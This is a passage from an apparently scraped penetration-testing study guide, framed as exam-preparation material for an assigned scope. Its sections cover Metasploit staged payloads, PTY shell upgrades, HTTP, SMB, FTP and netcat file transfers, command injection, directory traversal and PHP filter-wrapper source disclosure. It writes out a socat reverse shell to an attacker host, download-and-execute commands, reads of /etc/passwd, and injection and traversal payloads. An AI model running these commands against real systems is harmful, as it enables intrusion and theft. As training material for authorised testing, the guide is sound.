text: id="staged-versus-stageless">4.2.9.6.1.1 Staged versus stageless stageless: complete payload delivered at once; larger, usually simpler and more stable staged: small first stage connects and retrieves the rest; smaller initial footprint, needs matching handler and second transfer Metasploit naming commonly reflects the distinction: windows/x64/shell_reverse_tcp stageless windows/x64/shell/reverse_tcp staged A raw Netcat listener can receive many ordinary stageless command shells. A staged payload normally needs multi/handler configured with the exact same payload: msfconsole -q use exploit/multi/handler set payload PAYLOAD_NAME set LHOST LHOST set LPORT LPORT show options run A connection to Netcat with no usable commands can mean a staged payload reached a non-staging listener. It is not necessarily failed code execution. <h5

title: 4.2.9.6.1.2 Existing-PoC payload constraints
text: id="existing-poc-payload-constraints">4.2.9.6.1.2 Existing-PoC payload constraints Only when an existing reviewed PoC documents payload space and bad characters: msfvenom -p PAYLOAD_NAME \ LHOST=LHOST LPORT=LPORT \ -f FORMAT -v VARIABLE \ -b 'BAD_CHARACTERS' \ -s MAX_SPACE Encoders and repeated encoding do not guarantee antimalware evasion. -b is for bytes that the vulnerable input path cannot preserve; do not invent a universal bad-character list. <h3

title: 4.2.10.2.1 Find the clue from your starting access
text: id="find-the-clue-from-your-starting-access-5">4.2.10.2.1 Find the clue from your starting access Where to investigate: Inspect the working shell's terminal state and available PTY utilities after verifying a stable command channel. Discovery action — reference example: Execution context, effects and stopping rule Host/access: Verified command execution or authenticated remote access and a known network path Requires: A working channel and available PTY mechanism; correct local-terminal control sequence Action class: May create sessions, execute commands or transfer files. Stop/verify: Check tty, signal handling and an interactive program; confirm the same identity remains. Failure/next check: A dropped connection is not solved by terminal settings. If no PTY mechanism exists, use noninteractive commands or an authenticated terminal method. tty command -v python3 script socat Illustrative evidence — synthetic, abbreviated: The excerpt may combine command fields with labelled observations from the preceding investigation; it is not a real-target transcript or a promise of exact tool formatting. not a tty /usr/bin/python3 Recognize this detail: A functioning socket shell lacks a controlling terminal while a potential PTY mechanism exists. Still missing before method selection: Verify the available PTY mode, local terminal handling and stable connection; privilege remains unchanged. Outcome after checking Example and next decision Enabled after validation The supported PTY and local settings restore terminal behavior: use interactive tools in that same identity. Ruled out in this context The channel drops before any command executes: reject terminal settings as the first fault. Inconclusive No PTY utility found leaves alternative terminal methods/noninteractive use to investigate. title: 4.2.10.3 Prerequisites

title: 4.2.10.4 Discover and verify prerequisites
text: id="4-discover-and-verify-prerequisites-5">4.2.10.4 Discover and verify prerequisites tty command -v python3 script socat <h3

title: 4.2.10.5 Why it works
text: id="5-why-it-works-5">4.2.10.5 Why it works A socket-backed command stream is not automatically a terminal. A PTY and correct local raw/echo settings repair terminal behavior without changing privileges. <h3

title: 4.2.10.6 Execute and choose variants
text: id="6-execute-and-choose-variants-5">4.2.10.6 Execute and choose variants First obtain a PTY with an available interpreter: python3 -c 'import pty; pty.spawn("/bin/bash")' Press Ctrl-Z locally, then: stty raw -echo; fg Back in the remote shell: reset export TERM=xterm-256color stty rows 40 columns 120 If the local terminal becomes unreadable, restore it from a separate/local shell: stty sane Socat can provide a stronger PTY when present on both sides: <h4

title: 4.2.10.6.1 Kali
text: id="variant-4-2-10-6-1">4.2.10.6.1 Kali # Kali socat file:$(tty),raw,echo=0 tcp-listen:LPORT,reuseaddr <h4

title: 4.2.10.6.2 Target
text: id="variant-4-2-10-6-2">4.2.10.6.2 Target # Target socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:LHOST:LPORT TTY repair changes terminal behavior, not privilege or network reliability. A PTY may enable job control and programs that require a terminal; it does not turn a fragile route into a stable one. <h3

title: 4.2.10.7 Worked example — hypothetical
text: id="7-worked-example--hypothetical-5">4.2.10.7 Worked example — hypothetical Observation: the shell runs commands but interactive sudo fails. Test: spawn a PTY and repair local terminal settings. Illustrative output: tty reports a device and the prompt behaves correctly. Interpretation: retry the legitimate interactive prerequisite check. <h3

title: 4.2.11 Transfer over HTTP using Linux or Windows clients
text: id="transfer-over-http-using-linux-or-windows-clients">4.2.11 Transfer over HTTP using Linux or Windows clients Blocks: 7; transfers support 5–14. Operational procedure | Operational procedure | Quick sheet <h3

title: 4.2.11.1 Purpose and result
text: id="1-purpose-and-result-6">4.2.11.1 Purpose and result A downloaded file whose destination bytes can be verified. <h3

title: 4.2.11.2 Recognition clues
text: id="2-recognition-clues-6">4.2.11.2 Recognition clues A tool/artifact must reach a target that can make an HTTP request. <h4

title: 4.2.11.2.1 Find the clue from your starting access
text: id="find-the-clue-from-your-starting-access-6">4.2.11.2.1 Find the clue from your starting access Where to investigate: From the target's command context inspect downloader availability, writable destination and a route to the fixed served directory. Discovery action — reference example: Execution context, effects and stopping rule Host/access: Verified command execution or authenticated remote access and a known network path Requires: Correct server bind and served directory; target-to-server route, available downloader and writable destination Action class: May create sessions, execute commands or transfer files. Stop/verify: Compare sha256sum on Linux or Get-FileHash -Algorithm SHA256 on Windows, and verify destination permissions. Failure/next check: No request: route/bind/egress. 404: path/name. Matching file but no execution: interpreter/format/control. Diagnose each separately. command -v curl wget ls -ld /tmp ip route get LHOST Illustrative evidence — synthetic, abbreviated: The excerpt may combine command fields with labelled observations from the preceding investigation; it is not a real-target transcript or a promise of exact tool formatting. /usr/bin/curl /tmp: writable to current user LHOST via GATEWAY dev INTERFACE Recognize this detail: A downloader, destination and plausible outbound path enable an HTTP transfer candidate. Still missing before method selection: Check actual server bind/directory, HTTP request/response and source/destination hashes. Outcome after checking Example and next decision Enabled after validation The requested file is retrieved and its bytes match: use the verified copy. Ruled out in this context No permitted target-to-server route exists: reject this HTTP pull direction. Inconclusive A route without a logged request leaves bind/firewall/DNS unresolved. If you do not yet have this clue: start with Verify command execution, host and represented identity . <h3

title: 4.2.11.3 Prerequisites
text: id="3-prerequisites-6">4.2.11.3 Prerequisites Starting access: Verified command execution or authenticated remote access and a known network path. Required conditions: Correct server bind and served directory; target-to-server route, available downloader and writable destination. <h3

title: 4.2.11.4 Discover and verify prerequisites
text: id="4-discover-and-verify-prerequisites-6">4.2.11.4 Discover and verify prerequisites python3 -m http.server 8000 --bind LHOST --directory /PATH/TO/FILES <h3

title: 4.2.11.5 Why it works
text: id="5-why-it-works-6">4.2.11.5 Why it works The target is the HTTP client even when the assessment host started the operation. A 404 is a server-path problem; no request is a different boundary from successful download with incompatible execution. <h3

title: 4.2.11.6 Execute and choose variants
text: id="6-execute-and-choose-variants-6">4.2.11.6 Execute and choose variants On Kali, serve the directory containing linpeas.sh : cd /path/to/tools python3 -m http.server 8000 --bind 0.0.0.0 On the Linux target, download into a writable directory and run it: wget http://LHOST:8000/linpeas.sh -O /tmp/linpeas.sh chmod +x /tmp/linpeas.sh /tmp/linpeas.sh | tee /tmp/linpeas.txt Read: Kali should log an HTTP request and a successful response. A downloaded enumeration script is a lead generator; manually verify any escalation candidate. <summary

title: 4.2.11.6.1 HTTP variants — fixed server directory, curl, Windows and alternate built-ins
text: id="variant-4-2-11-6-1">4.2.11.6.1 HTTP variants — fixed server directory, curl, Windows and alternate built-ins <h5

title: 4.2.11.6.1.1 Serve a fixed directory without changing folders
text: id="serve-a-fixed-directory-without-changing-folders">4.2.11.6.1.1 Serve a fixed directory without changing folders python3 -m http.server 8000 --bind 0.0.0.0 --directory /path/to/tools Python's simple server supplies downloads over unencrypted HTTP. Stop it with Ctrl+C when finished. <h5

title: 4.2.11.6.1.2 Linux target with curl
text: id="linux-target-with-curl">4.2.11.6.1.2 Linux target with curl curl -fL http://LHOST:8000/FILE -o /tmp/FILE -f reports HTTP errors and -L follows redirects. Use a writable destination. <h5

title: 4.2.11.6.1.3 Windows target with PowerShell
text: id="windows-target-with-powershell">4.2.11.6.1.3 Windows target with PowerShell Run inside PowerShell: Invoke-WebRequest -Uri "http://LHOST:8000/FILE" -OutFile "C:\Windows\Temp\FILE" From cmd.exe , invoke PowerShell explicitly: powershell -NoProfile -Command "Invoke-WebRequest -Uri 'http://LHOST:8000/FILE' -OutFile 'C:\Windows\Temp\FILE'" <h5

title: 4.2.11.6.1.4 Windows alternatives
text: id="windows-alternatives">4.2.11.6.1.4 Windows alternatives (New-Object Net.WebClient).DownloadFile('http://LHOST:8000/FILE','C:\Windows\Temp\FILE') curl.exe -fL http://LHOST:8000/FILE -o C:\Windows\Temp\FILE certutil.exe -urlcache -split -f http://LHOST:8000/FILE C:\Windows\Temp\FILE Availability and policy can differ by host. certutil may leave URL-cache artifacts; remove only artifacts you created when cleanup is appropriate. Compare the source and destination hashes. On Kali or Linux: sha256sum FILE sha256sum /tmp/FILE On Windows: Get-FileHash -Algorithm SHA256 "C:\Windows\Temp\FILE" Decisive output: matching SHA-256 values establish that the two saved files contain the same bytes. A successful HTTP status alone does not. <h3

text: id="find-the-clue-from-your-starting-access-7">4.2.12.2.1 Find the clue from your starting access Where to investigate: Use established SSH context to identify allowed file/subsystem access and the intended remote destination's rights. Discovery action — reference example: Execution context, effects and stopping rule Host/access: Verified command execution or authenticated remote access and a known network path Requires: Reachable SSH/SFTP service, correct key/password and read/write rights; client/server subsystem compatibility Action class: May create sessions, execute commands or transfer files. Stop/verify: Verify copied bytes and location; uppercase -P selects scp's SSH port. Failure/next check: Authentication failure, missing subsystem and destination permission failure need different changes. Prefer a supported transfer method over guessing flags. ssh -v -p PORT USER@TARGET Illustrative evidence — synthetic, abbreviated: The excerpt may combine command fields with labelled observations from the preceding investigation; it is not a real-target transcript or a promise of exact tool formatting. Authenticated using publickey Session/subsystem policy: inspect before transfer Recognize this detail: SSH authentication gives a candidate transport; it does not prove SFTP/subsystem support or destination write. Still missing before method selection: Validate client/server subsystem compatibility, source read and destination write; inspect resulting bytes. Outcome after checking Example and next decision Enabled after validation The supported copy mode writes the intended file and hashes match: use SCP. Ruled out in this context The destination is unwritable: reject that path while retaining SCP to a permitted directory. Inconclusive Accepted SSH without subsystem evidence leaves transfer behavior unknown. If you do not yet have this clue: start with Use SSH passwords, keys and forwarding-capable access . <h3

Discovery action — reference example: Execution context, effects and stopping rule Host/access: Verified command execution or authenticated remote access and a known network path Requires: Inbound SMB listener on the server, outbound TCP/445 from the client, compatible SMB version and explicit share credentials Action class: May create sessions, execute commands or transfer files. Stop/verify: Verify source/destination hash and the share path; disconnect created mappings after use. Failure/next check: No route, conflicting cached connection, invalid share credentials and denied filesystem writes are independent failure points. Test-NetConnection LHOST -Port 445 net use Illustrative evidence — synthetic, abbreviated: The excerpt may combine command fields with labelled observations from the preceding investigation; it is not a real-target transcript or a promise of exact tool formatting. TcpTestSucceeded : True Existing connection: \\LHOST\OTHER_SHARE as OTHER_USER Recognize this detail: The service is reachable, but an existing connection can constrain a different credential context. Still missing before method selection: Verify intended share/server credentials, conflicting mappings, read/write rights and destination hash. Outcome after checking Example and next decision Enabled after validation The intended authenticated share action succeeds and bytes match: use this transfer route. Ruled out in this context Outbound SMB is blocked from this source: reject this direction, choosing another transport. text: id="start-an-authenticated-smb-share-on-kali">4.2.13.6.1.1 Start an authenticated SMB share on Kali mkdir -p share sudo impacket-smbserver transfer "$(pwd)/share" -smb2support -username USER -password 'PASSWORD' The first positional value is the share name; the second is its local directory. The supplied USER and PASSWORD authenticate to this temporary Kali share. Discovery action — reference example: Execution context, effects and stopping rule Host/access: Verified command execution or authenticated remote access and a known network path Requires: Unambiguous sender/receiver direction, compatible Netcat listener syntax and a writable output file Action class: May create sessions, execute commands or transfer files. Use SCP/HTTP/SMB when those routes exist. nc -h ls -ld /DESTINATION_DIRECTORY Illustrative evidence — synthetic, abbreviated: The excerpt may combine command fields with labelled observations from the preceding investigation; it is not a real-target transcript or a promise of exact tool formatting. Available client: Netcat implementation Direction: sender -> receiver listener Destination: writable Recognize this detail: A raw stream may move bytes only if roles and connection direction are correct; no integrity metadata is supplied. Outcome after checking Example and next decision Enabled after validation The chosen stream finishes with matching bytes: use the saved artifact. Discovery action — reference example: Execution context, effects and stopping rule Host/access: Verified command execution or authenticated remote access and a known network path Requires: Available Base64 encode/decode, adequate command length and a writable destination Action class: May create sessions, execute commands or transfer files. Use a network transfer for larger files. command -v base64 wc -c FILE Illustrative evidence — synthetic, abbreviated: The excerpt may combine command fields with labelled observations from the preceding investigation; it is not a real-target transcript or a promise of exact tool formatting. /usr/bin/base64 SMALL_BYTE_COUNT FILE Recognize this detail: A small artifact and compatible decoder make text transport plausible, without assuming large encoded commands survive. Outcome after checking Example and next decision Enabled after validation The complete decoded bytes match: use the text-transfer result. title: 4.2.16.2.1 Find the clue from your starting access
text: id="find-the-clue-from-your-starting-access-11">4.2.16.2.1 Find the clue from your starting access Where to investigate: Inspect whether a compatible FTP client is the remaining route and whether the temporary server's data channel is reachable. Discovery action — reference example: Execution context, effects and stopping rule Host/access: Verified command execution or authenticated remote access and a known network path Requires: A deliberately selected temporary server, correct served directory, control/data paths and binary transfer mode Action class: May create sessions, execute commands or transfer files. Stop/verify: Compare bytes and stop the temporary server after its purpose is complete. Failure/next check: A working control session with failed data transfer requires data-channel troubleshooting. Choose HTTP/SCP/SMB when available. ftp help quit Illustrative evidence — synthetic, abbreviated: The excerpt may combine command fields with labelled observations from the preceding investigation; it is not a real-target transcript or a promise of exact tool formatting. Client commands include: open, binary, get, put No transfer mode selected yet Recognize this detail: Client availability permits investigating FTP; binary mode and separate data-channel paths remain necessary. Still missing before method selection: Verify deliberate server scope, control/data connectivity, required read/write and post-transfer hashes. Outcome after checking Example and next decision Enabled after validation Binary transfer completes and hashes match: use that verified temporary copy. Ruled out in this context Only the control channel works and the required data route is blocked: reject this FTP path. Inconclusive Client presence alone leaves data transport and server rights unproved. If you do not yet have this clue: start with Verify command execution, host and represented identity . <h3

title: 4.2.16.3 Prerequisites
text: id="3-prerequisites-11">4.2.16.3 Prerequisites Starting access: Verified command execution or authenticated remote access and a known network path. Required conditions: A deliberately selected temporary server, correct served directory, control/data paths and binary transfer mode. <h3

title: 4.2.16.4 Discover and verify prerequisites
text: id="4-discover-and-verify-prerequisites-11">4.2.16.4 Discover and verify prerequisites ftp LHOST PORT binary <h3

title: 4.2.16.5 Why it works
text: id="5-why-it-works-11">4.2.16.5 Why it works FTP has separate control/data channels and can transform files in text mode. The temporary server's default permissions and authentication must be checked. <h3

title: 4.2.16.6 Execute and choose variants
text: id="6-execute-and-choose-variants-11">4.2.16.6 Execute and choose variants <summary

title: 4.2.16.6.1 Temporary FTP — only when an FTP client is the available route
text: id="variant-4-2-16-6-1">4.2.16.6.1 Temporary FTP — only when an FTP client is the available route On Kali, after intentionally selecting/installing pyftpdlib in an isolated environment: python3 -m pyftpdlib -p PORT On the target: ftp LHOST PORT binary get FILE put FILE quit The default temporary server can be unauthenticated and plaintext. Bind/serve only the intended directory, expose it only for the transfer, compare hashes and stop it immediately. HTTP/SCP/SMB are normally preferable. <h3

title: 4.2.16.7 Worked example — hypothetical
text: id="7-worked-example--hypothetical-11">4.2.16.7 Worked example — hypothetical Observation: a binary copied over FTP fails. Test: repeat in binary mode and compare hashes. Illustrative output: the second copy matches. Interpretation: transport mode, not payload generation, caused the failure. <h3

title: 4.2.16.8 Verify the result
text: id="8-verify-the-result-11">4.2.16.8 Verify the result Compare bytes and stop the temporary server after its purpose is complete. <h3

title: 4.2.16.9 Failure and fallback
text: id="9-failure-and-fallback-11">4.2.16.9 Failure and fallback A working control session with failed data transfer requires data-channel troubleshooting. Choose HTTP/SCP/SMB when available. <h3

text: id="10-next-transitions-11">4.2.16.10 Continue from the interpreted result Observed result Check before proceeding Next numbered section A downloaded/generated artifact exists but does not run Matching OS/process architecture, interpreter/loader/runtime, intact bytes, execute/destination permissions and compatible format §7.1.7 — Match an artifact to its executable consumer and runtime A tool/artifact must reach a target that can make an HTTP request Correct server bind and served directory; target-to-server route, available downloader and writable destination §4.2.11 — Transfer over HTTP using Linux or Windows clients An SSH identity can access the needed source/destination Reachable SSH/SFTP service, correct key/password and read/write rights; client/server subsystem compatibility §4.2.12 — Copy files through an authenticated SSH service <h2

title: 4.2.17 Sources and shared concepts
text: id="sources-and-shared-concepts">4.2.17 Sources and shared concepts Supplied PEN-200 command-to-shell pp257–259, Ch 19 selected PTY/forwarding examples and Ch 21 pp671–683. Hexdump Linux shell resources , Windows shell resources . Commands and their adjacent variant conditions are synchronized extracts of the linked operational procedures. Those procedures own complete execution details; this guide owns method selection, explanations and worked reasoning. Tool availability on the learner's Kali or a target must be checked in that environment.

title: 2.2 Turn application weaknesses into access
text: id="turn-application-weaknesses-into-access">2.2 Turn application weaknesses into access Strategy map | Master Notes | Operational index | Cheatsheets Prove the primitive first: file read, interpreted inclusion, write, query influence, authorization change or browser/server execution. Then validate the additional condition required to turn that primitive into useful access. Speedrun blocks: 4. Documented methods: 19. Examples are hypothetical study material. Apply commands only to an assigned scope during the later practice phase. A method is enabled by its prerequisites; its presence here does not establish a vulnerability or practical mastery. <h2

title: 2.2.1 First pass: tools and findings
text: id="first-pass-tools-and-findings">2.2.1 First pass: tools and findings Use the branch matching the current host, identity and observed result. Tool output supplies leads; the linked procedure verifies and uses the exact condition. <h3

title: 2.2.1.1 Test the primitive exposed by the real request
text: id="test-the-primitive-exposed-by-the-real-request">2.2.1.1 Test the primitive exposed by the real request Use this command branch only when an input reaches a utility/command context. Match the observed OS/parser. curl -skG --data-urlencode 'host=127.0.0.1;id' http://TARGET:PORT/PATH curl -skG --data-urlencode 'host=127.0.0.1&whoami' http://TARGET:PORT/PATH If Target UID/name appears only in the test response: Verify the destination and process identity; then choose a viable session route. → Verify command execution, host and represented identity . If Only a repeatable controlled delay is visible: Use the blind verification variants; one slow request proves nothing. → Prove visible or blind operating-system command injection . Otherwise: Input is only reflected: investigate another mapped input or mechanism. → Map parameters, API methods, objects and writable properties . <h3

title: 2.2.1.2 For file inputs, prove actual file read
text: id="for-file-inputs-prove-actual-file-read">2.2.1.2 For file inputs, prove actual file read Keep session and request method intact; choose a target file appropriate to the observed platform. curl -skG --data-urlencode 'file=../../../../../../etc/passwd' http://TARGET:PORT/PATH If Recognizable file contents: Retrieve relevant application config/source; classify any recovered material. → Classify the artifact and its identity context . If A PHP include sink accepts a filter wrapper: Test source disclosure separately from file execution. → Disclose PHP source through an inclusion wrapper . Otherwise: Only an error/template/status changed: return to request mapping; do not claim a file read. → Map parameters, API methods, objects and writable properties . <h3

title: 2.2.1.3 For uploads, locate the stored file and its handler
text: id="for-uploads-locate-the-stored-file-and-its-handler">2.2.1.3 For uploads, locate the stored file and its handler Acceptance, storage, retrieval and server-side execution are separate tests. printf '%s\n' 'UPLOAD_CANARY' > probe.txt curl -sk -b cookies.txt -F 'file=@probe.txt;type=text/plain' http://TARGET:PORT/upload If A controlled file is stored and retrieved: Check extension, interpreter and executable handler before choosing an execution payload. → Execute an uploaded file through a compatible handler . If The upload destination path is controllable: Identify the consumer that will use that exact location. → Use upload path control to reach a useful consumer . Otherwise: No compatible handler/consumer: treat it as storage and investigate another application boundary. → Cross role, function or session authorization boundaries . <h2

title: 2.2.2 Discovery workflow
text: id="discovery-workflow">2.2.2 Discovery workflow Start from a valid request produced by web mapping. Preserve account, cookies, method and normal input before changing one property. Follow these observations into a method; the detailed recognition routes below show synthetic output and the checks still needed. Locate file-related functions and distinguish reads, interpreted includes and writes: Read files through directory traversal ; Disclose PHP source through an inclusion wrapper ; Establish upload acceptance, storage and retrieval . Compare controlled commands or SQL predicates only in a known request context: Prove visible or blind operating-system command injection ; Establish SQL query influence and DBMS context . Use authorized role/object comparisons to identify missing server-side checks: Cross an object-ownership boundary ; Cross role, function or session authorization boundaries ; Modify a protected property through excessive writable fields . Prove the primitive, then inspect the additional execution/credential/consumer condition: Execute an uploaded file through a compatible handler ; Convert database rights into a file or operating-system effect ; Classify the artifact and its identity context . Decision rule: an observed clue opens a candidate. Choose it only after the missing conditions are verified; a failed check rules out that context, while unavailable evidence stays inconclusive . <h2

title: 2.2.3 Method families
text: id="method-families">2.2.3 Method families File read and interpreted inclusion: Read files through directory traversal , Disclose PHP source through an inclusion wrapper , Turn controlled local file content into inclusion execution . File writes and consuming handlers: Establish upload acceptance, storage and retrieval , Execute an uploaded file through a compatible handler , Use upload path control to reach a useful consumer . Command and database injection: Prove visible or blind operating-system command injection , Establish SQL query influence and DBMS context , Test a SQL-backed authentication bypass , Extract data through UNION and visible SQL results , Infer SQL data through boolean or time-based differences , Convert database rights into a file or operating-system effect , Conditional: validate an out-of-band SQL request channel . Application authorization and browser context: Cross an object-ownership boundary , Cross role, function or session authorization boundaries , Modify a protected property through excessive writable fields , Execute browser code and validate a useful same-origin action . Product features and server-side requests: Use WordPress component evidence and authorized administration features , Use server-side requests to inspect reachable internal behavior . <h2

title: 2.2.5 Read files through directory traversal
text: id="read-files-through-directory-traversal">2.2.5 Read files through directory traversal Blocks: 4. Operational procedure | Quick sheet <h3

title: 2.2.5.1 Purpose and result
text: id="1-purpose-and-result">2.2.5.1 Purpose and result A verified file-read primitive and relevant source/configuration/credential artifacts. <h3

title: 2.2.5.2 Recognition clues
text: id="2-recognition-clues">2.2.5.2 Recognition clues A download/path parameter or URL segment influences a local filename. <h4

title: 2.2.5.2.1 Find the clue from your starting access
text: id="find-the-clue-from-your-starting-access">2.2.5.2.1 Find the clue from your starting access Where to investigate: Find real download/preview/export requests in the behavior map; inspect which filename/path values the normal request accepts. Discovery action — reference example: Execution context, effects and stopping rule Host/access: A reproducible application request and a controlled input or access-context comparison Requires: Untrusted path reaches a filesystem read outside its intended directory; process identity can read the requested file Action class: Active weakness validation/exploitation; the selected primitive may read, write or execute. Stop/verify: Require recognizable target-file content and controls that exclude a reflected input or static error page. Failure/next check: An empty/denied response can be path depth, normalization or file permissions. If only file read is proven, follow credentials instead of assuming code execution. curl -sk -b cookies.txt -D - 'http://TARGET:PORT/download?file=report.pdf' Illustrative evidence — synthetic, abbreviated: The excerpt may combine command fields with labelled observations from the preceding investigation; it is not a real-target transcript or a promise of exact tool formatting. GET /download?file=report.pdf Content-Disposition: attachment; filename=report.pdf Body: EXPECTED_REPORT_BYTES Recognize this detail: An application-controlled file selection is the cue to test path confinement; it is not yet arbitrary read. Still missing before method selection: Request a known target-platform file through the real file parameter/path and compare with the normal response. Require recognizable file contents; a reflected filename, error or status change is not a read. Outcome after checking Example and next decision Enabled after validation A controlled out-of-directory request returns the intended target bytes: the traversal method is available. Ruled out in this context An allowlist rejects paths and only serves approved report IDs: this path-selection context is not a traversal route. Inconclusive An error mentioning a path shows influence but not read access; compare normal/control requests and permission/path depth. If you do not yet have this clue: start with Map functions, roles and normal requests manually . <h3

title: 2.2.5.3 Prerequisites
text: id="3-prerequisites">2.2.5.3 Prerequisites Starting access: A reproducible application request and a controlled input or access-context comparison. Required conditions: Untrusted path reaches a filesystem read outside its intended directory; process identity can read the requested file. <h3

title: 2.2.5.4 Discover and verify prerequisites
text: id="4-discover-and-verify-prerequisites">2.2.5.4 Discover and verify prerequisites curl -skG --data-urlencode 'file=../../../../../../etc/passwd' http://TARGET:PORT/PATH <h3

title: 2.2.5.5 Why it works
text: id="5-why-it-works">2.2.5.5 Why it works Traversal changes path resolution. URL decoding, application normalization and curl path normalization are separate layers; readable bytes do not establish interpreted inclusion. <h3

title: 2.2.5.6 Execute and choose variants
text: id="6-execute-and-choose-variants">2.2.5.6 Execute and choose variants Linux proof: curl -skG --data-urlencode 'file=../../../../../../etc/passwd' http://TARGET:PORT/PATH Windows proof: curl -skG --data-urlencode 'file=../../../../../../Windows/System32/drivers/etc/hosts' http://TARGET:PORT/PATH Decisive output: recognizable contents of the requested target file. 200 OK , a changed template or a filename reflected in an error is not proof. <summary

title: 2.2.5.6.1 Variant — traversal occurs in the URL path
text: id="variant-2-2-5-6-1">2.2.5.6.1 Variant — traversal occurs in the URL path curl -sk --path-as-is 'http://TARGET:PORT/static/../../../../etc/passwd' --path-as-is prevents curl from collapsing .. before sending the request. <summary

title: 2.2.5.6.2 Variant — basic normalization/filter tests
text: id="variant-2-2-5-6-2">2.2.5.6.2 Variant — basic normalization/filter tests ..%2f..%2f..%2fetc%2fpasswd %2e%2e/%2e%2e/%2e%2e/etc/passwd ....//....//....//etc/passwd Try these only after a plain baseline. Preserve the exact decoding layer that accepted the value. Next: use discovered user homes, application paths and configuration names to retrieve relevant source, keys or credentials. Send recovered authentication material to Block 5 with its source and identity context. <h3

title: 2.2.5.7 Worked example — hypothetical
text: id="7-worked-example--hypothetical">2.2.5.7 Worked example — hypothetical Observation: a download function accepts a filename. Test: request a recognizable system file with one controlled traversal. Illustrative output: expected account-file content. Interpretation: file read is confirmed; investigate relevant application configuration. <h3

title: 2.2.6.1 Purpose and result

title: 2.2.6.2 Recognition clues
text: id="2-recognition-clues-1">2.2.6.2 Recognition clues A PHP page/include parameter and possible access to local application files. <h4

title: 2.2.6.2.1 Find the clue from your starting access
text: id="find-the-clue-from-your-starting-access-1">2.2.6.2.1 Find the clue from your starting access Where to investigate: Inspect the normal page selector, PHP technology evidence and any readable source/configuration clue obtained during mapping. Discovery action — reference example: Execution context, effects and stopping rule Host/access: A reproducible application request and a controlled input or access-context comparison Requires: A PHP inclusion sink accepts the filter wrapper and the process can read the source Action class: Active weakness validation/exploitation; the selected primitive may read, write or execute. Stop/verify: Decode the response and identify real target source; normal HTML rendering does not prove source disclosure. Failure/next check: Wrapper filtering, missing path or a non-PHP read operation can defeat this route; retain ordinary traversal/source-disclosure evidence separately. curl -sk -D - 'http://TARGET:PORT/index.php?page=about' Illustrative evidence — synthetic, abbreviated: The excerpt may combine command fields with labelled observations from the preceding investigation; it is not a real-target transcript or a promise of exact tool formatting. Normal link: index.php?page=about Error for invalid page: include(PAGE.php): failed to open stream Recognize this detail: An include-related error suggests an evaluating PHP sink, unlike an ordinary file-download function. Still missing before method selection: Verify that the actual sink accepts a filter wrapper and returns decodable target source; errors alone do not prove it. Outcome after checking Example and next decision Enabled after validation The wrapper yields source that decodes correctly: use that source-disclosure method. Ruled out in this context The endpoint reads raw bytes through a wrapper-incompatible API: reject this PHP-inclusion hypothesis. Inconclusive PHP branding without sink evidence leaves inclusion unproved; investigate normal request/source behavior first. If you do not yet have this clue: start with Map functions, roles and normal requests manually . <h3

title: 2.2.6.3 Prerequisites
text: id="3-prerequisites-1">2.2.6.3 Prerequisites Starting access: A reproducible application request and a controlled input or access-context comparison. Required conditions: A PHP inclusion sink accepts the filter wrapper and the process can read the source. <h3

title: 2.2.6.4 Discover and verify prerequisites
text: id="4-discover-and-verify-prerequisites-1">2.2.6.4 Discover and verify prerequisites curl -skG --data-urlencode 'page=php://filter/convert.base64-encode/resource=index.php' http://TARGET:PORT/index.php <h3

title: 2.2.6.5 Why it works
text: id="5-why-it-works-1">2.2.6.5 Why it works The filter wrapper transforms file bytes before inclusion, allowing source disclosure instead of normal PHP evaluation. A generic file-download endpoint may not accept the same wrapper. <h3

title: 2.2.6.6 Execute and choose variants
text: id="6-execute-and-choose-variants-1">2.2.6.6 Execute and choose variants curl -skG --data-urlencode 'page=php://filter/convert.base64-encode/resource=index.php' http://TARGET:PORT/index.php printf '%s' 'BASE64_DATA' | base64 -d Prerequisite: a PHP file-inclusion sink that accepts the wrapper. The encoded output must decode to target source; a normal rendered page means the wrapper did not disclose source in that context. <h3

title: 2.2.7 Turn controlled local file content into inclusion execution
